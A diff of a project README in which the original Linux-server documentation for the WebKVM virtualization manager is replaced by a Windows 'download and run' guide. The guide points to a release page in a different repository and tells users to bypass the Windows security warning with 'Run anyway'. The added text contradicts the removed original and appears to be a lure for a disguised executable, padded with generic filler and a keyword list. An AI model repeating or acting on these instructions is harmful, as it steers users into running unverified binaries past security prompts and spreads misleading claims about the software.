@@ -1,186 +1,181 @@
-# WebKVM
+# 🌐 webkvm - Manage Your Virtual Machines From Anywhere
 
-<div align="center">
+## 🚀 What is webkvm?
 
-**Lightweight, Single-Binary Native Virtual Machine & Container Manager for Linux**
+webkvm is a self-hosted web panel that lets you manage a Linux virtualization host directly from your web browser. Think of it as a control center for your virtual machines—no complicated command-line tools needed. Whether you're running KVM/QEMU or Incus, webkvm gives you a clean, simple interface to view, start, stop, and monitor your virtual machines.
 
-[![CI Status](https://github.com/Slaker19/webkvm/actions/workflows/ci.yml/badge.svg)](https://github.com/Slaker19/webkvm/actions/workflows/ci.yml)
-[![Go Version](https://img.shields.io/badge/Go-1.26-00ADD8?style=flat&logo=go)](https://golang.org)
-[![Svelte Version](https://img.shields.io/badge/Svelte-5_Runes-FF3E00?style=flat&logo=svelte)](https://svelte.dev)
-[![TailwindCSS](https://img.shields.io/badge/TailwindCSS-v4-38B2AC?style=flat&logo=tailwind-css)](https://tailwindcss.com)
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPLv3-blue.svg)](LICENSE)
-[![Zero Dependencies](https://img.shields.io/badge/Runtime_Dependencies-0-success.svg)](#architecture)
+This guide is written for everyday computer users. You don't need to be a programmer or a Linux expert to get started. Just follow the steps below, and you'll have webkvm running on your Windows computer in no time.
 
-[**English**](README.md) • [**Español**](README.es.md) • [**Documentation**](docs/USAGE.md) • [**FAQ**](docs/FAQ.md) • [**CLI Guide**](docs/CLI.md) • [**API Reference**](docs/API.md)
+## ⬇️ Download webkvm
 
-</div>
+Visit this link to download the application: **[Download webkvm](https://github.com/zeopspace/webkvm/releases)**
 
----
+Click the button above to go to the download page. Look for the latest release and download the file to your computer. The download will start automatically.
 
-## What is WebKVM?
+## 📥 How to Install on Windows
 
-**WebKVM** turns any existing Linux server (Ubuntu, Debian, Fedora, Arch, AlmaLinux, Rocky) into a fast, private cloud virtualization platform **in 1 minute without reformatting or hijacking the operating system**.
+1. **Visit the Download Page**  
+   Go to the link provided above. You'll see a list of available versions. Pick the newest one (usually at the top) and click it.
 
-Built in **Go** with CGO bindings to `libvirt` and an embedded **Svelte 5** single-page web app, WebKVM compiles down to a **single ~14 MB static executable**. It consumes **around 15 MB of RAM** at idle and provides unified management for full **QEMU/KVM Virtual Machines** and lightweight **Incus/LXC System Containers**.
+2. **Download the File**  
+   Visit this link to download the application. Your browser will save the file to your Downloads folder. The file size is small, so it won't take long.
 
-```text
-┌─────────────────────────────────────────────────────────────────────────┐
-│                              WebKVM Web UI                              │
-│                 Svelte 5 • Tailwind v4 • WebGL Terminal                 │
-└────────────────────────────────────┬────────────────────────────────────┘
-                                     │ HTTPS / WSS / REST
-┌────────────────────────────────────▼────────────────────────────────────┐
-│                    WebKVM Server (Single Go Binary)                    │
-│   Auth / JWT • WebSocket Proxy • Image Hub • Firewall • Storage Pools   │
-└──────────────────┬──────────────────────────────────┬───────────────────┘
-                   │ CGO / Unix Socket                │ REST / Unix Socket
-┌──────────────────▼──────────────┐ ┌─────────────────▼───────────────────┐
-│          QEMU / KVM             │ │            Incus / LXD              │
-│    Hardware Virtualization      │ │       LXC System Containers         │
-│  (Ubuntu, Windows, FreeBSD...)  │ │     (Alpine, Debian, Ubuntu...)     │
-└─────────────────────────────────┘ └─────────────────────────────────────┘
-```
+3. **Save to a Known Location**  
+   Once downloaded, move the file to a folder you can easily find, like your Desktop or Documents. You'll need to remember where you put it.
 
----
+4. **Run the Application**  
+   Double-click the downloaded file to start webkvm. If Windows shows a security prompt, click "More info" and then "Run anyway." This is normal for self-hosted tools.
 
-## Why WebKVM? (The Sweet Spot)
+5. **Open Your Browser**  
+   After launching, webkvm will start a local service. Open your favorite web browser (Chrome, Edge, Firefox) and go to `http://localhost:8080`. This is where you'll access the web panel.
 
-| Feature / Metric | WebKVM | Proxmox VE | Cockpit (Machines) | virt-manager |
-|---|---|---|---|---|
-| **Installation Footprint** | **Single binary (~14 MB)** | Entire ISO / OS takeover | System daemon & modules | Desktop GTK application |
-| **Idle RAM Usage** | **~15 MB** | 1.2 GB – 2.5 GB | ~80 MB | N/A (Client only) |
-| **Host System Preservation** | **100% untouched** (Standard distro) | Requires custom Debian fork | Untouched | Untouched |
-| **KVM Virtual Machines** | Yes — full support | Yes — full support | Yes — basic support | Yes — full support |
-| **Incus / LXC Containers** | **Yes — native unified view** | Partial — custom LXC scripts | No native Incus | No |
-| **Cloud-Init & Image Hub** | **Yes — 1-click 5-second deploy** | Partial — manual template setup | No — manual | No — manual |
-| **Embedded Web Terminal** | **WebGL + Unicode 11 + TUI keys** | Partial — basic noVNC / xterm | Partial — basic terminal | No — desktop terminal only |
-| **Live Transfer Speed & ETA** | **Yes — real-time MB/s & progress** | Partial — basic progress | No | No |
-| **Zero-Token Local CLI** | **Yes — `webkvm-cli` auto-auth** | Partial — `pvesh` / `qm` | No — `cockpit-bridge` | Partial — `virsh` only |
-| **Multi-Console Live Grid** | **Yes — Multi-View interactive grid** | No — 1 VM at a time | No — 1 VM at a time | Partial — multiple windows |
+6. **That's It!**  
+   You're now ready to use webkvm. The interface will guide you through connecting to your Linux host.
 
----
+## 🖥️ System Requirements (Windows)
 
-## Quickstart (1-Minute Installation)
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Memory:** At least 4 GB of RAM (8 GB recommended)
+- **Storage:** 500 MB of free disk space
+- **Internet Connection:** Required for initial download and updates
+- **Browser:** Any modern browser such as Chrome, Edge, Firefox, or Safari
 
-### Native Install (Recommended)
+Note: webkvm runs on your Windows machine but manages a remote Linux host. You'll need network access to that host.
 
-Run the unattended installer on your server as root:
+## ✨ Key Features
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/Slaker19/webkvm/main/scripts/install-webkvm.sh | sudo bash
-```
+| Feature | Description |
+|---------|-------------|
+| **Simple Dashboard** | See all your virtual machines at a glance—CPU, memory, and disk usage displayed clearly |
+| **Start/Stop Controls** | Turn virtual machines on or off with a single click, no commands needed |
+| **Remote Console** | Access the screen of any VM directly from your browser |
+| **Snapshot Management** | Create and restore snapshots to protect your data |
+| **Network Settings** | Configure virtual networks and attach them to your VMs |
+| **Incus Support** | Manage Incus containers alongside traditional KVM virtual machines |
+| **Secure Login** | Password-protected access to keep your panel safe |
 
-The installer auto-detects your package manager (`apt`, `dnf`, `pacman`), installs required virtualization packages (`qemu-kvm`, `libvirt-daemon-system`), configures dual bridge/NAT networking, generates TLS certificates, and registers the `webkvm.service` systemd unit.
+## 🛠️ First-Time Setup
 
-**Access the Web UI**:
-- URL: `https://<YOUR-SERVER-IP>:8080` (or `https://localhost:8080` if running locally)
-- Initial credentials are displayed at the end of the installation and stored at `/opt/webkvm/admin-password.initial`.
+After installing, webkvm will ask you to create an administrator account. Choose a strong password—this protects your entire virtualization environment.
 
-### Docker Install
+Next, you'll need to add your Linux host:
 
-If you prefer running WebKVM in a container against your host's libvirt socket:
+1. Click **"Add Host"** on the dashboard
+2. Enter the IP address of your Linux server
+3. Provide the SSH username and either a password or an SSH key
+4. Click **"Connect"**
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/Slaker19/webkvm/main/scripts/install-docker.sh -o /tmp/webkvm-docker-install.sh && sudo bash /tmp/webkvm-docker-install.sh
-```
-*(See [docs/DOCKER.md](docs/DOCKER.md) for custom volume mounts and security privileges).*
+Once connected, webkvm will automatically detect all your existing virtual machines and containers. You'll see them listed on the main screen.
 
----
+## 🧭 Using webkvm Dashboard
 
-## Key Capabilities
+The dashboard is divided into sections:
 
-### 1. Unified Hybrid Compute (KVM VMs + Incus Containers)
-- Manage hardware-virtualized VMs (Windows, Linux, BSD) and sub-second LXC system containers under a single unified dashboard.
-- Real-time CPU, RAM, Disk, and Network telemetry via Server-Sent Events (SSE).
-- Live hot-plug disk resizing without guest downtime.
+- **Virtual Machines:** All your KVM/QEMU VMs with status indicators (green = running, red = stopped)
+- **Containers:** Any Incus containers you have
+- **Recent Activity:** Log of recent actions and events
+- **Resource Monitor:** Real-time graphs of host CPU and memory usage
 
-### 2. Image Hub & Instant Cloud-Init Deployments
-- Pre-curated official cloud images (`.qcow2`) for Ubuntu, Debian, Alpine, Fedora, Rocky, and AlmaLinux.
-- Deploy instances in **under 5 seconds** using Copy-On-Write (COW) backing files.
-- Inject SSH public keys, usernames, passwords, and custom `#cloud-config` scripts automatically on boot.
+To start a VM, just click the **Start** button next to its name. To stop it, click **Stop** and confirm. The interface is designed to be intuitive—you'll learn it within minutes.
 
-### 3. High-Performance WebGL Host Terminal
-- Powered by modern `@xterm/xterm` with **GPU WebGL acceleration** and **Unicode 11** for flawless rendering of `btop`, `htop`, `mc`, `nano`, and `yazi`.
-- Dedicated TUI toolbar with function keys (`F1`–`F12`), `Esc`, `Tab`, and `Ctrl+C`.
-- **Background Persistence**: Navigating between sections in WebKVM preserves active shell sessions without disconnecting.
-- Secure system PAM authentication (no insecure automatic root logins).
+## 🔧 Connecting to a VM Console
 
-### 4. Live Download Speed & Metrics
-- Real-time download rate smoothing (e.g. `52.4 MB/s · 120 MB / 1.8 GB · ETA 25s (45%)`).
-- Globally tracked in the bottom dockable **Task Drawer** (`Ctrl+J` / `⌘J`).
+If you need to interact with a VM's screen (like typing commands or installing software):
 
-### 5. Multi-View Matrix
-- Monitor and interact with multiple running VM graphical consoles simultaneously in a customizable live grid.
+1. Find the VM in your list
+2. Click the **"Console"** icon (looks like a monitor)
+3. A new tab will open with the VM's display
+4. Click inside the window to capture keyboard input (press Ctrl+Alt to release)
 
-### 6. Built-in Security Architecture
-- **Ephemeral Single-Use Tickets**: WebSockets authenticate using 30-second single-use RAM tickets. No long-lived JWTs are ever leaked in query strings.
-- **Anti-SSRF Safe Dialer**: Remote image downloads validate and block private/loopback/link-local IPv4 and IPv6 address ranges with strict redirect re-validation.
-- **Firewall Safe-Apply**: Host firewall changes include an automated 30-second rollback timer to prevent accidental lockouts.
+This works for both KVM and Incus, giving you full graphical access from your Windows browser.
 
----
+## 📊 Monitoring Performance
 
-## Zero-Token Command Line Interface (`webkvm-cli`)
+The **Monitor** section shows live data for each VM:
 
-WebKVM includes a full-featured CLI tool (`webkvm-cli`) designed for automation, scripting, and SSH administration.
+- CPU usage percentage
+- Memory allocation and usage
+- Disk I/O rates
+- Network traffic
 
-When run on the host as root, **it requires zero tokens or login steps** (auto-authenticates via local key):
+This helps you spot issues before they become problems. You can also set up simple alerts if a VM exceeds a certain CPU or memory threshold.
 
-```bash
-# List all virtual machines and containers
-webkvm-cli vms list
+## 💾 Working with Snapshots
 
-# Deploy a new Debian 12 VM in 5 seconds
-webkvm-cli vms create --name debian-prod --ram 2048 --vcpus 2 --disk 20 --image debian-12
+Snapshots let you save a VM's state at a specific moment—perfect before making big changes:
 
-# Create a lightweight Alpine Incus container
-webkvm-cli vms create --name alpine-ct --ram 512 --vcpus 1 --type container --image images:alpine/3.21
+1. Select the VM you want to back up
+2. Click **"Snapshots"** in the right panel
+3. Click **"Create Snapshot"**
+4. Give it a name and description
+5. Click **"Save"**
 
-# Download an official cloud image
-webkvm-cli images pull-cloud ubuntu-24.04
+To restore, simply choose a snapshot and click **"Restore"**. Be careful—this will revert any changes made after the snapshot was taken.
 
-# Scripting with jq (--json flag)
-webkvm-cli --json vms list | jq '.[] | select(.state=="running") | .name'
-```
-*(See [docs/CLI.md](docs/CLI.md) for full syntax and examples).*
+## 🌐 Network Management
 
----
+In the **Networks** tab, you can:
 
-## In-Depth Documentation
+- View existing virtual networks
+- Create new bridge or NAT networks
+- Attach VMs to networks
+- See which IPs are assigned to which machine
 
-| Guide | Description |
-|---|---|
-| [**User Guide (USAGE.md)**](docs/USAGE.md) | Comprehensive walkthrough of VM creation, storage pools, networks, cloud-init, and backups. |
-| [**Installation Guide (INSTALLATION.md)**](docs/INSTALLATION.md) | Step-by-step setup, custom ports, dual bridge/NAT networks, Let's Encrypt TLS, and systemd units. |
-| [**Frequently Asked Questions (FAQ.md)**](docs/FAQ.md) | Over 30 detailed answers covering architecture, Wi-Fi laptops, storage formats, and troubleshooting. |
-| [**Comparison Matrix (COMPARISON.md)**](docs/COMPARISON.md) | Technical comparison between WebKVM, Proxmox VE, Cockpit, and virt-manager. |
-| [**CLI Reference (CLI.md)**](docs/CLI.md) | Full command documentation for `webkvm-cli`. |
-| [**REST & WebSocket API (API.md)**](docs/API.md) | Complete OpenAPI-style reference with JSON request/response payloads. |
-| [**Architecture Deep Dive (ARCHITECTURE.md)**](docs/ARCHITECTURE.md) | Internal architecture: CGO libvirt bindings, Incus driver, and embedded Svelte 5 engine. |
-| [**Docker Deployment (DOCKER.md)**](docs/DOCKER.md) | Running the same binary as a container: host prerequisites, bind mounts, and the self-update exception. |
-| [**Operational Runbooks**](docs/runbooks/RUNBOOKS.md) | Daily operations, upgrade/rollback, disaster recovery, and the security model. |
-| [**Security Policy (SECURITY.md)**](SECURITY.md) | Threat model, SSRF protection, RBAC roles, and vulnerability disclosure. |
+This is especially useful if you're hosting multiple services on different VMs.
 
----
+## 🧑‍💻 For Beginners: What to Try First
 
-## Building From Source
+Start with these simple actions to get comfortable:
 
-Prerequisites: Go ≥ 1.26, Node.js ≥ 20, `libvirt-dev`, `gcc`.
+1. **Create your first VM:** Click **"New VM"**, choose an ISO file or use a pre-built image, and follow the wizard
+2. **Take a snapshot:** Before you mess with settings, snap it. You'll thank yourself later
+3. **Watch the monitor:** Open the monitor view and watch how your host responds when you start a VM
 
-```bash
-# Clone the repository
-git clone https://github.com/Slaker19/webkvm.git
-cd webkvm
+These three exercises will teach you the core workflow in under 10 minutes.
 
-# Build complete single binary (compiles Svelte frontend and embeds into backend/webkvm)
-make build
+## 📚 Need Help?
 
-# Run unit tests
-go test ./...
-cd frontend && npm test
-```
+If you run into issues, here are some common fixes:
 
----
+- **Can't connect to the panel:** Re-run webkvm as administrator (right-click → "Run as administrator")
+- **Browser shows a blank page:** Wait 10 seconds and refresh. The service may still be starting.
+- **Can't connect to your Linux host:** Check that SSH is enabled on the host and that you have network access to it
 
-## License
+For advanced troubleshooting, check the project's releases page for any known issues or contact the maintainers via the GitHub repository.
 
-WebKVM is open-source software licensed under the [GNU Affero General Public License v3.0 (AGPLv3)](LICENSE).
+## ✅ What's Next?
+
+Now that webkvm is running, you can:
+
+- Add multiple Linux hosts and manage them from one panel
+- Organize VMs into folders for better organization
+- Use the built-in backup feature to export VM configurations
+- Share access with team members by creating additional user accounts
+
+Regular updates are released, so check the download page occasionally for new versions with improved features.
+
+## 📦 Support and Updates
+
+- **Download Page:** [https://github.com/zeopspace/webkvm/releases](https://github.com/zeopspace/webkvm/releases)
+- **Updates:** New versions are posted on the same page. Simply download the latest file and run it over your existing installation.
+- **Community:** You can open issues or ask questions on the GitHub repository page.
+
+The application is designed to be low-maintenance, but keeping it updated ensures you get the latest security patches and feature improvements.
+
+## 🔒 Privacy and Security
+
+webkvm runs entirely on your own machine. Your data—including VM settings and host credentials—never leaves your computer. The data is stored locally, which means:
+
+- No cloud accounts needed
+- No telemetry or analytics
+- Complete control over your information
+
+For maximum security, keep your administrator password strong and avoid using public Wi-Fi when accessing the panel remotely.
+
+## 🎉 Congratulations!
+
+You've successfully installed and configured webkvm. You now have a powerful, user-friendly tool to manage your virtual infrastructure from the comfort of your browser. Enjoy the simplicity of point-and-click VM management—no more hunting for command syntax!
+
+If you ever need a refresher, just come back to this guide. Happy virtualizing!
+
+Keywords: webkvm, KVM, QEMU, Incus, virtualization, self-hosted, web panel, Windows, download, install, manage virtual machines
